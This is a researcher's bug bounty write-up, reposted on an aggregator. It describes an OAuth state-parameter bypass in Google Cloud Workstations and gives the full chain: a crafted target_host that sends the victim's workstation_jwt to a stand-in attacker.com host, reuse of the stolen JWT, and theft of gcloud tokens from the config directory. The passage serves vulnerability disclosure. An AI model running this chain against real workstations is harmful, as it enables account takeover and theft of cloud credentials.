---
title: Bypassing authorization in Google Cloud Workstations [Google VRP]
url: https://buaq.net/go-170229.html
source: unSafe.sh - 不安全
date: 2023-06-26
fetch_date: 2025-10-04T11:44:58.077852
---

# Bypassing authorization in Google Cloud Workstations [Google VRP]

* [unSafe.sh - 不安全](https://unsafe.sh)
* [我的收藏](/user/collects)
* [今日热榜](/?hot=true)
* [公众号文章](/?gzh=true)
* [导航](/nav/index)
* [Github CVE](/cve)
* [Github Tools](/tools)
* [编码/解码](/encode)
* [文件传输](/share/index)
* [Twitter Bot](https://twitter.com/buaqbot)
* [Telegram Bot](https://t.me/aqinfo)
* [Search](/search/search)

[Rss](/rss.xml)

[ ]
黑夜模式

![](https://8aqnet.cdn.bcebos.com/757b6d3ceec7395f1ecbc35f40137dc7.jpg)

Bypassing authorization in Google Cloud Workstations [Google VRP]

This write-up is a part of a series of write-ups about the bugs I and Sreeram found in Google C
*2023-6-25 19:8:56
Author: [govuln.com(查看原文)](/jump-170229.htm)
阅读量:30
收藏*

---

This write-up is a part of a series of write-ups about the bugs I and [Sreeram](https://twitter.com/kl_sree) found in Google Cloud in 2022.

While exploring Google Cloud, we came across Cloud Workstations, which provide IDEs such as Code-OSS, IntelliJ etc., that are hosted in your GCP project. I deployed a workstation with Code-OSS and started using it like a regular user to understand how the IDE is integrated with GCP.

![](https://blog.stazot.com/content/images/2023/01/image-6.png)

The workstations are hosted on a domain with the format - `80-{workstation-name}.cluster-{randomstring}.cloudworkstations.dev`. The number 80 at the beginning refers to the port in which the server is listening. It is followed by the name of the workstation and a random string appended to the word "cluster."

Using a non-google.com subdomain means the workstation cannot access a user's google.com cookies. So it should use another means of authorization. I looked into the authorization flow, and here is how it worked:

1. User opens `{something}.cloudworkstations.dev`
2. User gets redirected to `https://ssh.cloud.google.com/devshell/oauth?authuser=0&state={state-value}` *(This will be referred to as the authorization endpoint, moving forward)*
3. From there, if the user is authorized to use the workstation, then the user again gets redirected to `https://{something}.cloudworkstation.dev/_workstation/login?redirect={state-value}&workstation_jwt={jwt-value}`
4. The workstation then sets the `workstation_jwt` parameter's value as the cookie, and the user is now logged in

After looking into the flow, I realized that for a user to authenticate into the workstation, they need **a valid state parameter** and **a valid workstation\_jwt parameter** (which gets set as a cookie).

### Leaking the **workstation\_jwt parameter**

One way to leak the workstation\_jwt parameter would be the classic OAuth open redirect behavior. However, unlike a traditional OAuth setup, there is no redirect URI parameter. So, I wondered how the server knew where to redirect the user.

The state value was a base64 string, which, when decoded - contained the following JSON:

`{"token":"random-token","target_host":"80-{workstation-name}.cluster-{random-string}.cloudworkstations.dev","authuser":"","workstation_name":"projects/project-name-374312/locations/us-central1/workstationClusters/cluster-lcraajab/workstationConfigs/config-lcraw8nw/workstations/workstation-name","workstation_consumer_project_number":"0123456789"}`

Note that the `target_host` field contains the hostname of the workstation. Is the server redirecting the user to the hostname provided as the target\_host? To test this, I modified the hostname, re-encoded the JSON to base64 and sent a GET request to the following authorization endpoint:

`https://ssh.cloud.google.com/devshell/oauth?authuser=0&state={base64-encoded-JSON-payload}`![](https://blog.stazot.com/content/images/2023/01/image-7.png)

400 error for an invalid target\_host value

The response was a 400 error, indicating that the server was expecting a valid target\_host value. My next step was to bypass the validation of the target\_host value so that I could exfiltrate the workstation\_jwt value to an attacker-controlled server.

After some trial and error, I managed to bypass the validation using the following value for target\_host:

`attacker.com/80-{workstation-name}.cluster-{random-string}.cloudworkstations.dev`

Prepending the valid target\_host value with the attacker's domain and a forward slash did the trick. I used the above-shown value as target\_host in the JSON payload:

`{"token":"random-token","target_host":"attacker.com/80-{workstation-name}.cluster-{random-string}.cloudworkstations.dev","authuser":"","workstation_name":"projects/project-name-374312/locations/us-central1/workstationClusters/cluster-name/workstationConfigs/config-name/workstations/workstation-name","workstation_consumer_project_number":"0123456789"}`

Again, I base64 encoded the JSON value to create the state parameter and sent a GET request to the authorization endpoint. This time, *it worked!* The server redirected the user to the attacker's domain, which leaked the workstation\_jwt parameter to the attacker.

### Generating a valid state parameter

Although I bypassed the domain validation, I need a valid state parameter to pull off this attack. If the state parameter were tied to the session that generated it, then it would not be possible to exploit this bug.

However, *the state parameter was not tied to a session*. Hence it becomes trivial to generate a valid state value.

When the attacker tries to access a workstation that they do not have access to, they get redirected to `https://ssh.cloud.google.com/devshell/oauth?authuser=0&state={state-value}` where they are given a 500 error response. However, the state parameter that was generated by the server is valid for any user. Hence, this state value could be used for the attack.

![](https://blog.stazot.com/content/images/2023/01/image-8.png)

500 response to an unauthorized user

### The Chain

The final attack would look like this.

The attacker does the following to setup the attack:

1. Navigates to `{victim-subdomain}.cloudworkstations.dev`
2. Gets redirected to `https://ssh.cloud.google.com/devshell/oauth?authuser=0&state={state-value}` and given a 500 response
3. Decodes the state parameter from base64, and changes the target\_host value to `attacker.com/{victim-subdomain}.cloudworkstations.dev`
4. Re-encodes the JSON to base64 and creates a new state value
5. Crafts the OAuth URL with the modified state value - `https://ssh.cloud.google.com/devshell/oauth?authuser=0&state={malicious-state-value}` and sends the malicious link to the victim

*The victim opens the malicious link sent by the attacker.*

Once the victim opens the malicious link, the attacker receives a GET request to his server, which would have the workstation\_jwt value.

The attacker then navigates to `https://{victim-subdomain}.cloudworkstations.dev/_workstation/login?redirect={state-value}&workstation_jwt={victim-jwt-value}` and gains access to the victim's workstation

🎉

### Post Exploitation

Code-OSS requires the user to configure gcloud CLI to perform operations with Google Cloud resources. So it is likely that many users have configured it in their instances.

Once an attacker exploits this bug to compromise a user, who has configured gcloud CLI in their workstation, they can fetch the victim's gcloud Authorization token from the /home/user/.config directory. Using this token, the attacker could gain access to all the GCP resources of the victim.

### Random string in the subdomain

To exploit this issue, the attacker should know the victim workstation's subdomain, which contains a random string. It leaks in a couple of ways.

By default, all Cloud Workstations leaked the subdomain to the following third-party domains:

1. openvsxorg.blob.core.windows.net
2. open-vsx.org
3. vscode-cdn.net

Anyone with access to these domains or a vulnerability in these servers could list out all the workstation subdomains.

Secondly, anyone with a privilege as low as `workstations.operationViewer` can exploit this issue to gain complete control over a workstation and take over all of the victim's GCP resources, as desc...